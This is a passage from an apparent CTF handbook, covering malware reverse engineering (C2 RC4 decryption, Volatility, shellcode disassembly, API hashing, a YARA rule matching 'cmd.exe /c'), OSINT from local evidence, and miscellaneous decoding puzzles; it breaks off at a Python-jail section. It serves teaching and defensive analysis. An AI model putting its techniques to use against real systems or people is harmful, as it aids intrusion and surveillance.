-```bash
-pyinstxtractor-ng --help
-pyinstxtractor-ng sample.exe
-pycdc recovered.pyc > recovered.py
-uncompyle6 recovered.pyc > recovered-legacy.py
-```
-
-Use the extractor's actual output directory and interpreter version. A decompiler error often means unsupported bytecode, not missing content. Extracted `.pyc` files may need correct version headers. Do not assume pycdc supports every recent Python version, or install an unlisted PyArmor unpacker. When protected code cannot be recovered statically, identify resources/configs and use supplied memory evidence.
-
-For Android samples, **Kali jadx** (row 79): `jadx -d decoded sample.apk`. Inspect the manifest for exported receivers/services and startup triggers, then code references to network methods. Searching only `strings.xml` misses Java/Kotlin string literals. JNI/native libraries continue through the native reversing route.
-
-## C2 decoding: reconstruct first, decrypt second
-
-Use the network chapter's direction-aware reassembly. Record each message's length, direction, sequence number, nonce/IV, and cipher reset behavior. TLS decryption, WebSocket unmasking, application framing, and application encryption are separate layers. Wireshark **Decode As** can recognize a nonstandard TLS port without rewriting packet ports.
-
-For RC4, determine whether state resets per message or continues across the stream. A compact **WSL** implementation for a verified single stream:
-
-```python
-from pathlib import Path
-def rc4(key, data):
-    if not key: raise ValueError('empty key')
-    s,j = list(range(256)),0
-    for i in range(256):
-        j = (j+s[i]+key[i%len(key)]) & 255
-        s[i],s[j] = s[j],s[i]
-    i=j=0; out=bytearray()
-    for byte in data:
-        i=(i+1)&255; j=(j+s[i])&255
-        s[i],s[j]=s[j],s[i]
-        out.append(byte ^ s[(s[i]+s[j])&255])
-    return bytes(out)
-key = Path('rc4-key.bin').read_bytes()
-plain = rc4(key,Path('ciphertext.bin').read_bytes())
-Path('decrypted.bin').write_bytes(plain)
-print(repr(plain[:200]))
-```
-
-A first 32-byte packet is a key only if sample logic confirms that design. “Concatenate both directions chronologically” is valid only for an unusual protocol explicitly sharing state; most protocols have independent direction state. For rotating passwords, reconstruct time bucket/sequence units and timezone from implementation and capture timestamps.
-
-Crypto clues: RC4 initializes a 256-byte permutation; ChaCha uses `expand 32-byte k`; AES often contains S-box constants; TEA/XTEA often uses `0x9E3779B9`. Constants alone do not identify mode, key derivation, or padding. For Camellia-based samples, inspect **WSL OpenSSL** `openssl list -cipher-algorithms`; PyCryptodome does not supply the source's invented `Crypto.Cipher.Camellia` module. Verify mode/block framing before using a locally supported primitive.
-
-RAT-specific leads: DarkComet-like logs may exist in `%APPDATA%\dclogs\*.dc`; inspect memory file objects and Run keys. Beacon-like samples often store structured configuration values; decode XOR wrappers and trace configuration parsing in Ghidra. Timing, URI names, and a familiar port do not prove a malware family. Recovered Telegram tokens stay evidence: do not call live bot APIs or retrieve third-party messages.
-
-## Memory and controlled runtime work
-
-Use supplied memory dumps first. **WSL Volatility 3**, with existing matching symbols only:
-
-```bash
-vol --offline -f memory.dmp windows.pstree
-vol --offline -f memory.dmp windows.psscan
-vol --offline -f memory.dmp windows.cmdline
-vol --offline -f memory.dmp windows.netscan
-vol --offline -f memory.dmp windows.malfind
-```
-
-Check `vol --help` for current plugin names. Symbol ZIPs are unavailable (Unapproved row 82). Suspicious executable private memory can suggest injection; JIT runtimes also legitimately create executable regions. Correlate contents, mapped files, threads, and process ancestry. `malfind` is a heuristic, not a complete detector.
-
-On approved **Windows x64dbg**, a justified runtime inspection belongs in an organizer-provided disposable analysis environment with network isolation. WSL, Wine, a timeout, or `strace` alone does not isolate malware from your files or network. Set breakpoints at allocation/decryption handoff, inspect the resulting buffer in the Dump view, and save only the relevant region for static analysis. Follow injection API chains as evidence; you do not need to reproduce injection against another process.
-
-For a permitted isolated Linux runtime, **Kali**:
-
-```bash
-strace -f -s 256 -e trace=network,file -o trace.log ./sample
-ltrace -f -o library-trace.log ./sample
-```
-
-These commands execute the sample. If that environment is absent, continue static/dump analysis. No dynamic execution is required merely because a sample contains an environment check.
-
-For raw shellcode, **WSL**:
-
-```bash
-objdump -D -b binary -m i386:x86-64 -M intel shellcode.bin
-```
-
-Set the correct architecture before interpreting output. A decoder loop's XOR/subtract operations wrap modulo 256: `((byte-0x32)&255) ^ key[i%len(key)]`. Preserve exact key bytes, including newlines. Junk push/pop sequences may alter flags or fault; confirm data/control dependencies before deleting them from an analysis model.
-
-## Local indicators and API hashes
-
-**Kali YARA**, row 164. Save as `case.yar`:
-
-```yara
-rule Case_Config_Lead {
-    strings:
-        $a = "challenge-marker" ascii wide
-        $b = "cmd.exe /c" ascii wide nocase
-    condition:
-        $a and $b
-}
-```
-
-```bash
-yara -s case.yar sample.bin
-yara -s case.yar memory.dmp
-```
-
-Replace `challenge-marker` with a distinctive recovered string. Broad “not MZ” rules match almost every non-PE file and are not useful evidence. Retain matching offsets for follow-up extraction.
-
-For API hashing, export names from relevant challenge DLLs and compute the **sample's** hash locally. A common ROR13-add hypothesis:
-
-```python
-from pathlib import Path
-def api_hash(name):
-    h=0
-    for c in name.encode('ascii'):
-        h=((h>>13)|(h<<19))&0xffffffff
-        h=(h+c)&0xffffffff
-    return h
-target=0x12345678  # comparison constant from the sample
-for name in Path('exports.txt').read_text().splitlines():
-    if api_hash(name)==target: print(name)
-```
-
-Check name casing, terminating NUL, DLL-name inclusion, and seed. Hash collisions require validating the resolved API's arguments/call sites. No online hash database is needed.
-
-Source material adapted: all five files in `ctf-malware/`. The useful manual decompiler/debugger reasoning from `tools-mcp.md` was retained; agent calls and unsupported debuggers were removed. Live bot access, ARP interception/RST injection, unapproved parser packages, and public sandbox uploads were excluded.
-
-
----
-
-<a id="10-osint"></a>
-
-# OSINT from supplied evidence
-
-Build an evidence trail from a clue to an answer. Preserve exact identifiers, original text, dates, and uncertainty. A matching username, reused photograph, or hosting IP is a lead; it does not independently establish identity or location.
-
-This chapter emphasizes local files and organizer-provided material. Use the handbook's competition rules before consulting external sites. Do not upload challenge images to reverse-image services, use face recognition, contact people or bots, or treat a recovered token as permission to access an account.
-
-## Environment and local inventory
-
-**Windows native:** Chrome and a PDF viewer, Windows workbook rows 12 and 10. **WSL:** Python 3, ExifTool, pdftotext, strings (Windows rows 14, 21, 22, 18). **Kali:** Git, ripgrep, ImageMagick, SQLite, MediaInfo (Kali rows 56, 126, 74, 138, 94). Keep those environments distinct; a Kali tool is not automatically installed in WSL.
-
-Use a notebook or CSV with these columns:
-
-```text
-clue_id,source_file,source_offset_or_page,observation,hypothesis,confidence,next_check
-```
-
-Example observation: “profile-export.json contains account ID 123 and display name Harbor.” Hypothesis: “Harbor is the account's current alias.” The number is more stable than a display name, but exported metadata can still be fabricated.
-
-**Kali**, search a supplied evidence directory without contacting its links:
-
-```bash
-rg -n -i 'username|handle|author|identifier|location|latitude|longitude' evidence
-rg -n -i 'https?://|mailto:|t\.me/|github\.com/' evidence
-```
-
-**WSL**, inspect media metadata and PDF text:
-
-```bash
-exiftool -a -u -g1 evidence/photo.jpg
-exiftool -GPSLatitude -GPSLongitude -GPSLatitudeRef -GPSLongitudeRef -n evidence/photo.jpg
-pdftotext -layout evidence/document.pdf document.txt
-strings -a -n 6 evidence/blob.bin > blob-strings.txt
-```
-
-Expected result: concrete coordinates, timestamps, embedded names, document titles, or linked identifiers. Metadata can be edited or stripped; absence is not proof of deception. Do not assume every social platform always removes every metadata field.
-
-## Parse saved pages and JSON
-
-Saved HTML may include richer JSON-LD or application state than the visible page. In Chrome, open a **copy** only if its active-content behavior is understood; otherwise read as text. Search for `application/ld+json`, `author`, `identifier`, `content`, and media URLs. Keep archived fetch date separate from the page's claimed publication date.
-
-This **WSL standard-library** script extracts link targets and script blocks from a local saved page. It does not fetch them. Save as `page_extract.py`:
-
-```python
-from html.parser import HTMLParser
-from pathlib import Path
-
-class Page(HTMLParser):
-    def __init__(self):
-        super().__init__(); self.links=[]; self.blocks=[]; self.current=None
-    def handle_starttag(self, tag, attrs):
-        attrs=dict(attrs)
-        for key in ('href','src'):
-            if key in attrs: self.links.append((tag,key,attrs[key]))
-        if tag=='script': self.current=[attrs.get('type',''),[]]
-    def handle_data(self,data):
-        if self.current is not None: self.current[1].append(data)
-    def handle_endtag(self,tag):
-        if tag=='script' and self.current is not None:
-            self.blocks.append(self.current); self.current=None
-
-p=Page(); p.feed(Path('page.html').read_text(encoding='utf-8',errors='replace'))
-for item in p.links: print(item)
-out=Path('page-scripts'); out.mkdir(exist_ok=True)
-for i,(kind,chunks) in enumerate(p.blocks):
-    (out/f'{i:03d}.txt').write_text(''.join(chunks),encoding='utf-8')
-    print(i,kind)
-```
-
-Read extracted JSON with `python3 -m json.tool page-scripts/000.txt` when that block is actual JSON. JavaScript assignments are not JSON; extract the value deliberately rather than executing the block. An HTTP 200 status can be a login wall or generic “not found” page; compare body content and stable identifiers.
-
-## Aliases, social exports, and timestamps
-
-In supplied profile exports, correlate numeric IDs, explicit cross-links, avatar history, post IDs, and dates. Same handles on different platforms are not identity proof. Numeric suffixes could be postal codes, years, random numbers, or deliberate misdirection; test alternatives against independent evidence.
-
-For a Twitter-style Snowflake **known to use that scheme**, decode its creation timestamp locally:
-
-```python
-from datetime import datetime,timezone
-snowflake=1234567890123456789  # replace with the observed numeric ID
-milliseconds=(snowflake>>22)+1288834974657
-print(datetime.fromtimestamp(milliseconds/1000,timezone.utc).isoformat())
-```
-
-Discord uses a different epoch; other services use entirely different ID schemes. A calculated timestamp does not prove an account belongs to a person. Retain the original identifier alongside the derived time.
-
-For saved social-media datasets, inspect all supplied posts/replies, bios, playlist descriptions, role names, emoji frames, and image variants. Short-duration GIF frames can hide text; use the steganography chapter's animation workflow. Preserve playlist/album order when testing acrostics. For gaming data, include realm/server and character IDs; a character name without server context is ambiguous.
-
-A supplied fitness route can identify a **challenge location** from its path and landmarks. Do not infer or expose a real person's home from privacy-zone boundaries. Use the exact endpoint/waypoint requested by the challenge, and distinguish a route from the camera position.
-
-## Unicode and encoded clues
-
-Before normalizing text, list its codepoints. Homoglyph encodings often mix Latin and Cyrillic lookalikes, but emoji, accents, and smart punctuation are not automatically secret bits. **WSL:**
-
-```python
-from pathlib import Path
-import unicodedata
-text=Path('post.txt').read_text(encoding='utf-8')
-for i,c in enumerate(text):
-    print(i,repr(c),f'U+{ord(c):04X}',unicodedata.name(c,'CONTROL'))
-pairs={'a':'\u0430','e':'\u0435','o':'\u043e','p':'\u0440','c':'\u0441','x':'\u0445'}
-zeros=set(pairs); ones=set(pairs.values())
-bits=''.join('0' if c in zeros else '1' for c in text if c in zeros|ones)
-for shift in range(8):
-    b=bits[shift:]
-    data=bytes(int(b[i:i+8],2) for i in range(0,len(b)-7,8))
-    print(shift,repr(data))
-```
-
-The explicit alphabet is a hypothesis; change it only with evidence. Whole-text ASCII/non-ASCII encoding is a different scheme and includes spaces/punctuation differently. Record the choice so someone else can reproduce it.
-
-For a Base58 clue, preserve leading `1` characters as leading zero bytes:
-
-```python
-from pathlib import Path
-alphabet='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
-s=Path('base58.txt').read_text().strip()
-number=0
-for ch in s: number=number*58+alphabet.index(ch)
-zeroes=len(s)-len(s.lstrip('1'))
-decoded=b'\0'*zeroes+number.to_bytes((number.bit_length()+7)//8,'big')
-print(repr(decoded))
-```
-
-Validate a Base58Check checksum when the format requires one. Strings of 32/40/64 hexadecimal characters can be MD5/SHA-1/SHA-256, but may also be random IDs, Tor fingerprints, keys, or data. Length is a classification clue, not a definitive algorithm detector.
-
-## Geolocation without image uploads
-
-Make an observation sheet before choosing a country: readable sign fragments, writing systems, road numbers, driving side, rail crossings, building layout, terrain, coastline, shadows, and unique small objects. Generic architecture and vegetation should carry low confidence. A Cyrillic sign does not uniquely identify Russia, and motorway sign colors vary by road class; the source's one-feature country table was too strong.
-
-**Kali ImageMagick**, row 74, makes local inspection copies:
-
-```bash
-magick photo.jpg -crop 600x300+120+80 +repage -resize 200% sign.png
-magick sign.png -flop mirrored-sign.png
-magick sign.png -colorspace Gray -auto-level contrast-sign.png
-```
-
-The crop is `width×height+x+y`; measure it on the image. `-flop` mirrors horizontally. Use nearest-neighbor scaling for pixel grids; ordinary photo inspection can use other interpolation. Preserve the original and record transformations. Do not invent illegible letters; keep alternate readings in the notes.
-
-Compare candidate photographs/maps already supplied by the organizer. Verify at least two independent scene constraints: building alignment plus road geometry, or sign plus coastline. For exact viewpoint tasks, match camera position using foreground poles, paths, bollards, and the relative alignment of distant buildings. The subject's coordinate can differ substantially from the camera's.
-
-For newspaper or product clues, use supplied catalogs/archives: record publication date, page number, headline, model number, voltage/capacity, and dimensions. A matching brand without the exact model is insufficient. For a series of music landmarks, solve locations first, then assemble the per-image key numbers in the specified order; do not adjust uncertain locations merely to force readable ASCII.
-
-## Coordinates and local spatial checks
-
-Latitude/longitude order and hemisphere signs are frequent errors. Decimal degrees are not degrees-minutes-seconds. An MGRS string includes zone, latitude band, grid square, and equally precise easting/northing digits; do not treat it as a decimal coordinate. A short Plus Code needs a reference locality; a full Open Location Code does not. What3Words is a distinct system and cannot be converted using a guessed word grid.
-
-When non-AI Python libraries are needed in **WSL**, Windows row 14 permits them except explicit exclusions; use a documented coordinate conversion library only after checking its input/output convention. Do not assume public conversion websites are an approved analysis route. If the required proprietary lookup is unavailable, preserve the verified coordinates and state the conversion dependency.
-
-For a supplied `places.csv` with `name,lat,lon`, this **WSL** script ranks locations near a clue coordinate using a spherical distance:
-
-```python
-import csv,math
-latitude,longitude=13.7563,100.5018  # replace with clue coordinates
-def distance(lat,lon):
-    a,b=map(math.radians,(latitude,lat))
-    dlat=b-a; dlon=math.radians(lon-longitude)
-    h=math.sin(dlat/2)**2+math.cos(a)*math.cos(b)*math.sin(dlon/2)**2
-    return 6371000*2*math.asin(min(1,math.sqrt(h)))
-rows=[]
-with open('places.csv',newline='',encoding='utf-8') as f:
-    for row in csv.DictReader(f):
-        rows.append((distance(float(row['lat']),float(row['lon'])),row['name']))
-for metres,name in sorted(rows)[:20]: print(round(metres,1),name)
-```
-
-Expected result: a candidate list, not a final match. Ten metres may be smaller than the map's coordinate error. For a supplied OSM JSON export, filter `elements[].tags` for `shop`, `amenity`, `railway`, and `tourism`, then compare proximity locally. Ways may need geometry/centroids; a node-only export can omit the desired business entirely.
-
-## DNS, registration, archives, and infrastructure
-
-Start with supplied DNS captures, zone files, WHOIS/RDAP exports, certificate records, or archive indexes. Extract TXT/CNAME/MX records and preserve answer timestamps/TTL. TXT records can consist of multiple strings within one record: join those in order, but do not merge independent answers arbitrarily.
-
-A stored archive index can reveal old URLs and date ranges; an archived snapshot's timestamp is the crawl time, not the original publication time. Compare saved old/new pages for changed aliases and links. For saved Google Docs/Sheets exports, preserve document IDs and sheet IDs; a private-access response is not a puzzle to bypass.
-
-Registrars, shared name servers, shared IPs, and ASNs are infrastructure correlations, not ownership proof. IP geolocation may point to a provider, VPN, or coarse regional estimate. A reused SSH host key or certificate can indicate a reused image/configuration rather than one physical server. Tor relay fingerprint/family data in a supplied export can support chronology, but does not identify a user.
-
-Active DNS queries, zone transfers, service fingerprinting, and scanning belong only to a challenge-designated target and the permitted tools for that machine. This offline chapter does not turn a public hostname found in evidence into an attack target. Do not copy the historical cross-challenge infrastructure-pivot advice into event practice.
-
-## Repository and file-metadata pivots
-
-**Kali Git**, row 56, on a supplied local repository:
-
-```bash
-git -C repo log --all --format='%H %aI %an <%ae> %cn <%ce>'
-git -C repo log --all --diff-filter=D --name-status
-git -C repo log --all -p -- '*.private' '*.key' '*.txt'
-git -C repo show COMMIT:path/to/file
-```
-
-Replace `COMMIT` with an observed ID. Examine `.mailmap`, README links, contributors, commit messages, and supplied issue/review exports. Author/committer fields are user-controlled; most Git history is not cryptographically signed. Even a valid signature needs a trusted key-to-identity link.
-
-For a supplied `.DS_Store`, inspect filenames with a permitted local non-AI parser in WSL; Finder metadata indicates names seen in a directory, not contents or necessarily current files. Do not recursively fetch discovered paths from unrelated sites. For TTF remapping clues, a non-AI `fontTools` script can inspect cmap and glyph contours locally; contour matching works best against the exact reference font and normalization, not any arbitrary standard font.
-
-## Finish the chain
-
-For each answer component, record the source, exact observation, transformation, and independent confirmation. Keep rejected hypotheses too when they explain ambiguity. A final location should state whether it is a building, camera point, route waypoint, or coordinate grid cell, with the requested precision.
-
-Source material adapted: all five files in `ctf-osint/`. Agent automation, paid/API-key services, public image uploads, face recognition, credentialed Discord enumeration, live bot interaction, invasive location inference, and cross-challenge pivots were excluded. Their underlying local evidence-reading methods are retained where useful.
-
-
----
-
-<a id="11-miscellaneous"></a>
-
-# Miscellaneous: turn unfamiliar artifacts into a small model
-
-“Misc” is a repository label, not one of the event's six official categories. Its material often belongs to cryptography, forensics, network analysis, steganography, reverse engineering, or a web challenge. Use the artifact and intended operation to choose the next step.
-
-This chapter covers layered encodings, symbolic puzzles, jails, games, audio/RF data, and challenge navigation. Work only on supplied files and assigned challenge services. A challenge container escape is not authorization to modify the organizer's Kali host, workstation, or scoring platform.
-
-## 1. Platform map
-
-| Task | Windows/WSL route | Organizer Kali route |
-|---|---|---|
-| Decode bytes or solve small puzzles | WSL Python 3 standard library | Python 3; check actual interpreter |
-| QR scanning | Listed WSL ZBar | Use a provisioned approved scanner if available; do not assume Windows tools are duplicated |
-| Inspect bytes | Windows HxD or WSL xxd | Listed file, local editor, Python |
-| Audio/spectrogram | Standard-library WAV inspection below | Listed Audacity, Sonic Visualiser, FFmpeg, SoX |
-| Source search | Editor or Python file reads | Listed ripgrep |
-| Constraints | Small Python enumeration; permitted non-AI library if added under Windows-sheet policy | Use a provisioned library; installation permission is not inferred |
-| Interactive protocol | Python socket to the assigned host | Python socket or listed Ncat |
-
-There is no all-tools installation command. Check the exact dependency for the next step. The Windows sheet permits non-AI Python libraries; it does not make rejected tools or AI/ML libraries acceptable. Do not use online decoders, compilers, or analysis services for challenge material.
-
-## 2. Preserve the original and inspect the representation
-
-Save as `inspect_bytes.py`, then run `python3 inspect_bytes.py artifact.bin`:
-
-```python
-from pathlib import Path
-from collections import Counter
-import hashlib
-import math
-import sys
-
-data = Path(sys.argv[1]).read_bytes()
-counts = Counter(data)
-entropy = -sum((n/len(data))*math.log2(n/len(data)) for n in counts.values()) if data else 0
-print('bytes:', len(data))
-print('sha256:', hashlib.sha256(data).hexdigest())
-print('first64 hex:', data[:64].hex())
-print('first64 repr:', repr(data[:64]))
-print('byte entropy:', round(entropy, 3))
-```
-
-High entropy suggests compressed, encrypted, or naturally varied data; it does not identify which. A known magic header plus a mismatched extension is more useful than entropy alone. Keep transformed outputs under new names so you can reverse a mistaken branch.
-
-**Kali only:** `file artifact.bin` provides another format hypothesis. Check the actual bytes before trusting an extension or a single tool label.
-
-## 3. Decode one layer with a reason
-
-| Appearance | Candidate | Confirm before decoding again |
-|---|---|---|
-| Even number of hex digits | Hex bytes | Decoded length halves; inspect header |
-| Alphabet/base64 padding | Base64 | Strict decoder accepts it; inspect bytes |
-| A–Z and 2–7 | Base32 | Padding/case rules match |
-| `%xx` sequences | URL encoding | Distinguish bytes from Unicode text |
-| `\xNN`, `\uNNNN` | Language/string escapes | Decode according to the source language |
-| Two decimal digits per byte | BCD | Each nibble must be 0–9 |
-| Mostly invisible Unicode | Tags/variation selectors/zero-width marks | Print code points, not rendered text |
-| Numeric columns | ASCII, coordinates, or samples | Check ranges and column meaning |
-
-Save as `encoding_toys.py`:
-
-```python
-import base64
-import codecs
-from urllib.parse import unquote_to_bytes
-
-original = b'CTF{layers}'
-encoded = base64.b64encode(original.hex().encode()).decode()
-stage1 = base64.b64decode(encoded, validate=True)
-stage2 = bytes.fromhex(stage1.decode('ascii'))
-assert stage2 == original
-assert unquote_to_bytes('CTF%7Blayers%7D') == original
-assert codecs.decode(codecs.encode('hello', 'rot_13'), 'rot_13') == 'hello'
-print(encoded)
-print(stage1)
-print(stage2)
-```
-
-The order matters: base64 decoding reveals hex text, then hex decoding reveals the flag-shaped toy. Do not feed arbitrary strings to `eval` to “decode” them.
-
-### Unicode tags and variation selectors
-
-Save as `unicode_inspect.py`, then run it on a UTF-8 text file:
-
-```python
-from pathlib import Path
-import sys
-import unicodedata
-
-text = Path(sys.argv[1]).read_text(encoding='utf-8')
-tags = []
-selectors = []
-for position, char in enumerate(text):
-    point = ord(char)
-    if point > 127 or not char.isprintable():
-        print(position, f'U+{point:04X}', unicodedata.name(char, 'UNNAMED'))
-    if 0xE0020 <= point <= 0xE007E:
-        tags.append(point-0xE0000)
-    # A common byte mapping, not a universal Unicode steganography standard.
-    if 0xFE00 <= point <= 0xFE0F:
-        selectors.append(point-0xFE00)
-    elif 0xE0100 <= point <= 0xE01EF:
-        selectors.append(point-0xE0100+16)
-print('tag ASCII:', bytes(tags))
-print('selector bytes:', bytes(selectors))
-```
-
-The tags block and variation-selector mapping are different encodings. Confirm the producer's convention. Zero-width characters can encode bits with a custom alphabet; enumerate symbols first. UTF-16 endianness reversal instead acts on byte pairs, so retain original bytes rather than copying rendered text.
-
-### Floats, Gray code, and BCD
-
-Save as `numeric_encodings.py`:
-
-```python
-import struct
-
-raw = b'ABCD'
-value = struct.unpack('<f', raw)[0]
-assert struct.pack('<f', value) == raw
-print('float carrying four bytes:', value)
-
-def gray_to_binary(gray):
-    result = gray
-    while gray:
-        gray >>= 1
-        result ^= gray
-    return result
-
-for n in range(256):
-    assert gray_to_binary(n ^ (n >> 1)) == n
-print('Gray-code checks passed')
-
-packed = bytes([0x12, 0x34, 0x56])
-digits = ''
-for byte in packed:
-    hi, lo = byte >> 4, byte & 15
-    assert hi < 10 and lo < 10
-    digits += str(hi) + str(lo)
-assert digits == '123456'
-print(digits)
-```
-
-A decimal float text dump may have rounded away the original bits. IEEE-754 endian choice and width matter. Gray code requires cumulative XOR, not simply reading the Gray-coded integer as binary. Packed BCD is not hexadecimal ASCII.
-
-## 4. Archive and polyglot puzzles
-
-List contents before extraction. Nested archives may hide a password or next filename in metadata, comments, or a previous layer. Do not blindly recurse without depth, size, and path limits.
-
-**Kali only**, for the listed archive tools:
-
-```bash
-7z l challenge.zip
-unzip -l challenge.zip
-```
-
-For a ZIP on either Python environment, use `zipfile.ZipFile(...).infolist()` to inspect names, compressed/uncompressed lengths, and comments. The web chapter includes a path/symlink inspector. Extract into a fresh challenge directory only after reviewing traversal and total size.
-
-PNG/JAR/ZIP, JPEG/HTML, and WAV/polyglot formats exploit parsers that read different regions. Identify where each parser starts and stops. Appended ZIP data may be visible to an archive reader even when an image viewer ignores it. Do not execute an embedded JAR or program merely because an image opened successfully.
-
-RTF custom tags and SMS PDU payloads need format-aware extraction. Preserve escape sequences, record PDU user-data length and encoding, and reassemble concatenated SMS parts by their reference/sequence fields. Ordinary UTF-8 decoding is not a substitute for GSM 7-bit unpacking.
-
-## 5. QR reconstruction and other visual alphabets
-
-Determine the module grid, orientation, polarity, and quiet zone. A normal QR has three finder patterns and timing patterns; decorative image pixels are not necessarily modules. Rotate/flip only with a record of each transformation.
-
-For a text file of `0`/`1` module rows, save `grid_to_pgm.py`:
-
-```python
-from pathlib import Path
-import sys
-
-rows = [line.strip() for line in Path(sys.argv[1]).read_text().splitlines() if line.strip()]
-assert rows and all(len(row) == len(rows[0]) for row in rows)
-assert all(set(row) <= {'0', '1'} for row in rows)
-scale, quiet = 8, 4
-height, width = len(rows), len(rows[0])
-out_w, out_h = (width+2*quiet)*scale, (height+2*quiet)*scale
-pixels = bytearray()
-for y in range(out_h):
-    for x in range(out_w):
-        gx, gy = x//scale-quiet, y//scale-quiet
-        dark = 0 <= gx < width and 0 <= gy < height and rows[gy][gx] == '1'
-        pixels.append(0 if dark else 255)
-Path('grid.pgm').write_bytes(f'P5\n{out_w} {out_h}\n255\n'.encode()+pixels)
-print(out_w, out_h, 'grid.pgm')
-```
-
-**Windows WSL**, with listed ZBar:
-
-```bash
-python3 grid_to_pgm.py modules.txt
-zbarimg --raw grid.pgm
-```
-
-Expected output is decoded text, which may itself be another layer. If scanning fails, inspect the grid visually and check whether `1` should be light instead. Do not “repair” random modules until finder/timing patterns and dimensions are consistent.
-
-For tile reassembly, use filenames, directory indexes, edge continuity, and QR structural constraints to reduce permutations. A nonogram may produce the QR grid: solve row/column run constraints, then render with the script above. Hexadecimal Sudoku may similarly map symbols to image modules.
-
-Pigpen, flag semaphore, musical intervals, DTMF, keyboard shifts, and MaxiCode have different symbol systems. Identify the alphabet first. ZBar support is not universal across barcode types; a scanner failure may mean unsupported symbology rather than a damaged image.
-
-## 6. Audio: inspect channels before interpreting tones
-
-**Kali only**, with listed FFmpeg:
-
-```bash
-ffprobe -v error -show_entries stream=codec_name,sample_rate,channels,bits_per_sample -of default=noprint_wrappers=1 audio.wav
-ffmpeg -i audio.wav -lavfi showspectrumpic=s=1600x900:legend=1 spectrum.png
-```
-
-Open the spectrogram and look for text, repeated bursts, paired tones, or frequency shifts. Try Audacity's Spectrogram view if you need to zoom and compare channels. Preserve the original sample rate; resampling can destroy symbol timing.
-
-On Windows WSL, a standard-library WAV inspection works without assuming FFmpeg:
-
-```python
-# Save as wav_info.py; run: python3 wav_info.py audio.wav
-import wave
-import sys
-
-with wave.open(sys.argv[1], 'rb') as wav:
-    print('channels:', wav.getnchannels())
-    print('sample width:', wav.getsampwidth())
-    print('sample rate:', wav.getframerate())
-    print('frames:', wav.getnframes())
-    print('seconds:', wav.getnframes()/wav.getframerate())
-```
-
-The `wave` module handles supported uncompressed WAV variants, not every audio codec. An unsupported-format error means use an available approved decoder, not rename an MP3 to `.wav`.
-
-### Morse bursts from one PCM channel
-
-Save as `morse_runs.py`. It prints high/low envelope run lengths; it does not guess a threshold or a Morse alphabet for you.
-
-```python
-import sys
-import wave
-import struct
-import math
-
-filename = sys.argv[1]
-threshold = float(sys.argv[2])  # RMS amplitude, e.g. 1000 for 16-bit PCM
-channel = int(sys.argv[3]) if len(sys.argv) > 3 else 0
-with wave.open(filename, 'rb') as wav:
-    assert wav.getsampwidth() == 2, 'requires 16-bit PCM'
-    count, rate = wav.getnchannels(), wav.getframerate()
-    assert 0 <= channel < count
-    raw = wav.readframes(wav.getnframes())
-samples = struct.unpack('<'+'h'*(len(raw)//2), raw)[channel::count]
-window = max(1, rate//100)  # approximately 10 ms
-states = []
-for start in range(0, len(samples), window):
-    chunk = samples[start:start+window]
-    rms = math.sqrt(sum(x*x for x in chunk)/len(chunk))
-    states.append(rms > threshold)
-runs = []
-for state in states:
-    if runs and runs[-1][0] == state:
-        runs[-1][1] += 1
-    else:
-        runs.append([state, 1])
-for state, length in runs:
-    print('tone' if state else 'gap', round(length*window/rate, 3))
-```
-
-```bash
-python3 morse_runs.py audio.wav 1000 0
-```
-
-Expect short/long tone clusters and several gap clusters. For conventional Morse, dot and dash lengths are roughly 1:3; within-letter, letter, and word gaps are roughly 1:3:7. Choose the basic unit from the run histogram, not a single noisy burst. If both channels differ, run each separately. Continuous music requires band filtering before envelope thresholding.
-
-### DTMF, SSTV, and hidden sample bits
-
-DTMF uses one low and one high frequency per key. After decoding digits, repeated presses may represent multi-tap text rather than a telephone number. Compare tone duration and pauses.
-
-SSTV sounds like a long modulated image transmission. The Kali sheet has an `sstv`/PySSTV entry, but package name and decoding CLI capability must be verified with local help; do not assume an encoder package provides the source repository's decoder command. MMSSTV and RX-SSTV are explicitly unapproved. If the provided CLI cannot decode, retain the mode/timing observations and report the limitation.
-
-Sample LSB extraction needs the correct sample width, signedness, endian order, channel, and bit order. Read PCM values rather than the WAV header bytes. Test whether an extracted stream begins with a plausible header; a handful of printable bytes is weak evidence.
-
-## 7. RF/IQ files: get units and layout right
-
-An IQ file may contain interleaved signed 8-bit, signed 16-bit, or float32 I/Q pairs. Determine the format from the challenge description or generator. A wrong dtype can produce a plausible-looking but meaningless constellation.
-
-Save as `iq_peek.py` for a **little-endian float32 IQ** hypothesis:
-
-```python
-from pathlib import Path
-import struct
-import math
-import sys
-
-raw = Path(sys.argv[1]).read_bytes()
-assert len(raw) % 8 == 0, 'not whole float32 I/Q pairs'
-pairs = list(struct.iter_unpack('<ff', raw[:8*10000]))
-assert pairs and all(math.isfinite(i) and math.isfinite(q) for i, q in pairs)
-power = sum(i*i+q*q for i, q in pairs)/len(pairs)
-print('pairs total:', len(raw)//8)
-print('first five:', pairs[:5])
-print('sampled mean power:', power)
-```
-
-Next establish sample rate, occupied bandwidth, carrier offset, symbol rate, and modulation. With a provisioned non-AI numerical library, plot a short spectrum and constellation locally. For QAM, carrier rotation and timing recovery must precede symbol slicing. Try a known preamble to resolve quadrant ambiguity and bit order.
-
-FFT bins are in cycles per sample until multiplied by the sample rate. A frequency peak in a squared signal is not always the symbol rate; modulation and filtering can produce harmonics. Validate the proposed rate by a stable eye/constellation and repeated frame synchronization.
-
-Manchester coding, whitening, convolutional coding, checksums, and framing may follow demodulation. A valid packet CRC is a much stronger success check than a few recognizable letters.
-
-## 8. Interactive protocols without losing synchronization
-
-Read the prompt and response framing before automating. A service may use newline-delimited JSON, length prefixes, menus, or multiple phases. TCP reads do not correspond one-to-one with server messages.
-
-Save as `read_prompt.py` and replace the host/port only with the assigned challenge endpoint:
-
-```python
-import socket
-import sys
-
-host, port = sys.argv[1], int(sys.argv[2])
-with socket.create_connection((host, port), timeout=5) as sock:
-    sock.settimeout(5)
-    stream = sock.makefile('rb')
-    line = stream.readline(65537)
-    if len(line) > 65536:
-        raise SystemExit('line exceeds local limit')
-    print(repr(line))
-```
-
-This reads one line and sends nothing. If the prompt has no newline, use a bounded `recv` loop until the observed delimiter instead. Preserve state in one connection when the challenge requires it; reconnecting may reset the secret or invalidate prior observations.
-
-For a timed multi-phase puzzle, implement and test each local solver first, then connect the phases through explicit parsers. Never use a remote response as Python source. Treat a timeout as an unknown state, not automatically a wrong answer.
-
-## 9. Python jails: inspect the evaluator, then build the primitive
-
-Read the supplied jail source. Record the Python version, `eval` versus `exec`, available globals/builtins, input normalization, blacklist/allowlist, AST checks, length limit, output handling, and whether state persists between inputs.
-
